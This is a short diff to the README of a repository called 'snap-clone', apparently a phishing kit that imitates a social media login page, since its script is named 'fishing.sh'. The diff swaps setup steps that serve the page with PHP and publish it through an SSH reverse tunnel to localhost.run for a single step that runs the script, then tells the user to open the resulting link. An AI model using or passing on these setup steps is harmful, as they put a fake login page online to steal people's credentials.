@@ -8,11 +8,9 @@ Step1: - git clone https://github.com/officialkeshav/snap-clone
 
 Step2: - cd snap-clone
 
-Step3: - php -S 127.0.0.1:8080
+Step3: - bash fishing.sh
 
-Step4: - ssh -R 80:localhost:8080 nokey@localhost.run
-
-Step5: - copy link and paste link in crome
+Step4: - copy link and paste link in crome
 ## Features
 
 - Colourful interface
